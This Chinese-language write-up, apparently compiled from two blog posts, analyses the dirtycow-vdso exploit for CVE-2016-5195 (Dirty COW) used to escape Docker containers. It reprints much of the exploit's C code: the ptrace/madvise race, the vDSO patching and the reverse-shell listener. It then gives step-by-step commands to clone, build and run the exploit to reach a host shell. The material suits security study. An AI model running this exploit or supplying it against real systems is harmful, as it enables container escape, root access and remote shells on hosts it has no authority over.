---
description: 脏牛漏洞-Docker逃逸
---

# 脏牛漏洞-Docker逃逸POC\(dirtycow-vdso\)代码分析

以下内容来自「CSDN博主[enjoy5512](https://me.csdn.net/enjoy5512) 的文章[脏牛漏洞-Docker逃逸POC\(dirtycow-vdso\)代码分析](https://blog.csdn.net/enjoy5512/article/details/53196047)」以及「[  
Lyy's Blog](http://ksowo.com/)的文章--[docker用脏牛逃逸到宿主机](http://ksowo.com/2018/07/20/docker%E7%94%A8%E8%84%8F%E7%89%9B%E9%80%83%E9%80%B8%E5%88%B0%E5%AE%BF%E4%B8%BB%E6%9C%BA/)」，如有侵权，请联系删除！

## 利用代码原出处

 [代码原帖](http://mp.weixin.qq.com/s?__biz=MjM5Njc3NjM4MA==&mid=2651069205&idx=3&sn=2c79678bcfcde9113f3d6848277ffa0a&chksm=bd14abc68a6322d0d5855c5d8ec3b8c5cf7c75886b3b7464c242adc1864cfb1af22bf63a39d7&mpshare=1&scene=23&srcid=1105rp9r0ZahYZNG6KJufSkp#rd)

本人GitHub也保留有漏洞利用相关代码  
 [CVE-2016-5195](https://github.com/whu-enjoy/CVE-2016-5195)

作者 : 武汉大学Docker安全研究小组

## 一 . 代码运行流程 <a id="&#x4E00;-&#x4EE3;&#x7801;&#x8FD0;&#x884C;&#x6D41;&#x7A0B;"></a>

 Main函数

```c
int main(int argc, char *argv[])
{
    struct prologue *prologue;
    struct mem_arg arg;
    uint16_t port;
    uint32_t ip;
    int s;

    ip = htonl(PAYLOAD_IP);
    port = htons(PAYLOAD_PORT);

    if (argc > 1) {
        if (parse_ip_port(argv[1], &ip, &port) != 0)
            return EXIT_FAILURE;
    }

    fprintf(stderr, "[*] payload target: %s:%d\n",
        inet_ntoa(*(struct in_addr *)&ip), ntohs(port));

    arg.vdso_addr = get_vdso_addr();
    if (arg.vdso_addr == NULL)
        return EXIT_FAILURE;

    prologue = fingerprint_prologue(arg.vdso_addr);
    if (prologue == NULL) {
        fprintf(stderr, "[-] this vDSO version isn't supported\n");
        fprintf(stderr, "    add first entry point instructions to prologues\n");
        return EXIT_FAILURE;
    }

    if (patch_payload(prologue, ip, port) == -1)
        return EXIT_FAILURE;

    if (build_vdso_patch(arg.vdso_addr, prologue) == -1)
        return EXIT_FAILURE;

    s = create_socket(port);
    if (s == -1)
        return EXIT_FAILURE;

    if (exploit(&arg, true) == -1) {
        fprintf(stderr, "exploit failed\n");
        return EXIT_FAILURE;
    }

    yeah(&arg, s);

    return EXIT_SUCCESS;
}
```

![](../../../../.gitbook/assets/image%20%2824%29.png)

![](../../../../.gitbook/assets/image%20%2823%29.png)

![](../../../../.gitbook/assets/image%20%2820%29.png)

## 二 . 函数分析 <a id="&#x4E8C;-&#x51FD;&#x6570;&#x5206;&#x6790;"></a>

### 1 . htonl/htons <a id="1-htonlhtons"></a>

htonl 传统内存数据存储方式 -&gt; 网络字节存储 4字节

```text
    eg :　htonl(0x1234) -> 0x4321
```

htons 传统内存数据存储方式 -&gt; 网络字节存储 2字节

```text
    eg :  htons(0x12)   -> 0x21
```

### 2 . prase\_ip\_port <a id="2-praseipport"></a>

函数原型

```text
static int 
    parse_ip_port(char *str, uint32_t *ip, uint16_t *port)
```

函数介绍

如果输入参数有:,则将:前的字符转化为IP,后面的字符转化为端口并赋值给port

使用示例

```text
eg:prase_ip_port("127.0.0.1:1234", ip, port)
调用结果:
    IP = 127.0.0.1
    PORT = 1234
```

### 3 . get\_vdso\_addr <a id="3-getvdsoaddr"></a>

函数原型

```text
static void *get_vdso_addr(void)
{
    return (void *)getauxval(AT_SYSINFO_EHDR);
}
```

函数介绍  
 通过getauxval\(\)函数获取vDSO的地址

### 4 . fingerprint\_prologue <a id="4-fingerprintprologue"></a>

函数原型

```text
static struct prologue *
    fingerprint_prologue(void *vdso_addr)
```

函数介绍

通过vDSO的首地址,找到clock\_gettime\(\)函数的地址,然后对比clock\_gettime函数前几个字符和prologue\[\]数组的每一项,如果存在匹配项,则说明可以Inline Hook,返回匹配的prologue数组项

关键代码

```text
for (i = 0; i < ARRAY_SIZE(prologues); i++) {
        p = &prologues[i];
        if (memcmp((void *)clock_gettime_addr, p->opcodes, p->size) == 0)
            return p;
    }
```

### 5 . patch\_payload <a id="5-patchpayload"></a>

函数原型

```text
static int 
    patch_payload(struct prologue *p, uint32_t ip, uint16_t port)
```

函数介绍

将payload中的IP,PORT,prologue项,分别替换成新的IP,PORT\(通过参数修改\),prologue\(通过fingerprint\_prologue\(\)匹配得到\)

### 6 . build\_vdso\_patch <a id="6-buildvdsopatch"></a>

函数原型

```text
static int 
    build_vdso_patch(void *vdso_addr, struct prologue *prologue)
```

函数介绍  
 填充vdso\_patch数组,如果要放置payload的内存地址数据不为0,则提示  
  
 `failed to find a place for the payload`  


vdso\_patch数组元素介绍

|  | vdso\_patch\[0\] | vdso\_patch\[1\] |
| :--- | :--- | :--- |
| patch | payload | buf = “e8 0xxxxx” |
| copy | 保存原内存数据的内存地址 | 保存clock\_gettime前prologue-&gt;size字节数据的内存地址 |
| size | payload\_len | prologue-&gt;size |
| addr | payload将要被复制到的内存地址 | clock\_gettime的地址 |

### 7 . create\_socket <a id="7-createsocket"></a>

函数原型

```text
static int create_socket(uint16_t port)
```

函数介绍  
 设置一个监听socket,等待payload被执行,向这个socket发起连接

### 8 . exploit <a id="8-exploit"></a>

函数原型

```text
static int exploit(struct mem_arg *arg, bool do_patch)
```

函数介绍,通过漏洞,将数据写到指定内存地址  
 do\_patch = true  
 =&gt; 将payload写进vDSO,修改clock\_gettime前面几个字节为jmp payload  
 do\_patch = false  
 =&gt; 将vDSO地址中原来的数据还原回去

主要代码

```text
    pid = fork();
    if (pid == -1) {
        warn("fork");
        return -1;
    } else if (pid == 0) {
        check(arg);
    }

    arg->stop = false;
    pthread_create(&pth1, NULL, madviseThread, arg);
    pthread_create(&pth2, NULL, ptrace_thread, arg);
```

这里开启两个进程,子进程不停检查数据是否成功写入,成功则返回0,否则返回1  
 主线程开启两个线程,  
 ptrace\_thread 向vDSO写  
 madvise\_thread 将vDSO映射空间释放,对ptrace线程造成干扰,从而触发漏洞,写入成功  
 ptrace循环写

```text
while (n >= sizeof(long)) {
        memcpy(&value, s, sizeof(value));
        if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1) {
            warn("ptrace(PTRACE_POKETEXT)");
            return -1;
        }

        n -= sizeof(long);
        d += sizeof(long);
        s += sizeof(long);
    }
```

madivise循环释放

```text
while (!arg->stop) {
        if (madvise(arg->vdso_addr, VDSO_SIZE, MADV_DONTNEED) == -1) {
            warn("madvise");
            break;
        }
    }
```

### 9 . yeah <a id="9-yeah"></a>

函数原型

```text
static int yeah(struct mem_arg *arg, int s)
```

函数介绍  
 等待连接  
 还原原vDSO空间数据  
 处理连接后的数据发送与接收

关键代码  
 循环等待连接,有连接之后就关闭监听

```text
    while (1) {
        c = accept(s, (struct sockaddr *)&addr, &addr_len);
        if (c == -1) {
            if (errno == EINTR)
                continue;
            warn("accept");
            return -1;
        }
        break;
    }

    close(s);
```

连接成功后,将vDSO还原

```c
if (fork() == 0) {
        if (exploit(arg, false) == -1)
            fprintf(stderr, "[-] failed to restore vDSO\n");
        exit(0);
    }
```

绑定输入输出到socket,处理连接数据

```c
    fds[0].fd = STDIN_FILENO;
    fds[0].events = POLLIN;

    fds[1].fd = c;
    fds[1].events = POLLIN;

    nfds = 2;
    while (nfds > 0) {
        if (poll(fds, nfds, -1) == -1) {
            if (errno == EINTR)
                continue;
            warn("poll");
            break;
        }

        if (fds[0].revents == POLLIN) {
            n = read(STDIN_FILENO, buf, sizeof(buf));
            if (n == -1) {
                if (errno != EINTR) {
                    warn("read(STDIN_FILENO)");
                    break;
                }
            } else if (n == 0) {
                break;
            } else {
                writeall(c, buf, n);
            }
        }

        if (fds[1].revents == POLLIN) {
            n = read(c, buf, sizeof(buf));
            if (n == -1) {
                if (errno != EINTR) {
                    warn("read(c)");
                    break;
                }
            } else if (n == 0) {
                break;
            } else {
                writeall(STDOUT_FILENO, buf, n);
            }
        }
    }
```

## 容器逃逸漏洞复现

测试环境虚拟机：ubuntu14.04，安装docker 

1、安装docker：

```text
apt-get install docker.io
```

 具体安装可见官方文档：[https://docs.docker.com/install/linux/docker-ce/ubuntu/](https://docs.docker.com/install/linux/docker-ce/ubuntu/)

2、在docker中pull一个ubuntu:14.04

```text
docker pull ubuntu:14.04docker images
```

看看已有容器

![](http://ksowo.com/images/blog/docker/1.png)

3、 接下来我们创建一个守护态的Docker容器，然后使用docker attach命令进入该容器。

```text
docker run -itd ubuntu:14.04 /bin/bash
```

4、然后我们使用docker ps查看到该容器CONTAINER ID信息，接下来就使用docker attach进入该容器

```text
docker attach CONTAINER ID
```

![](http://ksowo.com/images/blog/docker/2.png)

5、安装编译软件，下载exp

```text
apt-get install -y build-essential
apt-get install -y nasm
apt-get install -y git
git clone https://github.com/scumjr/dirtycow-vdso
make
ifconfig
```

make完后在目录多出一个0xdeadbeef,执行命令：  
./0xdeadbeef docker的IP:端口

![](http://ksowo.com/images/blog/docker/3.png)

等一会然后发现终端没输出了，在里面输入命令会有回显

![](http://ksowo.com/images/blog/docker/4.png)

对比IP地址，上图为宿主，下图为docker容器

![](http://ksowo.com/images/blog/docker/5.png)

6、提权原理可以看  
[https://bbs.pediy.com/thread-220057.htm](https://bbs.pediy.com/thread-220057.htm)  
[https://blog.csdn.net/enjoy5512/article/details/53196047](https://blog.csdn.net/enjoy5512/article/details/53196047)

7、用下面2中方式启动容器依然可以

```c
docker run --cap-drop setuid -itd zangniu:1 /bin/bash
docker --selinux-enabled=false run -itd zangniu:1 /bin/bash
```



